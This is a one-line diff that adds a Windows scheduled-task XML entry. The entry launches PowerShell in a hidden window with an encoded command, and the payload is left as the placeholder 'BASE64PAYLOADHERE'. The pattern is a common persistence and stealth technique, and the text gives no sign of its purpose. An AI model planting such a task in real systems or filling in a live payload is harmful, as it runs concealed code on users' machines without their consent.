@@ -1,0 +1,1 @@
+<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-WindowStyle Hidden -EncodedCommand BASE64PAYLOADHERE</Arguments></Exec></Actions></Task>
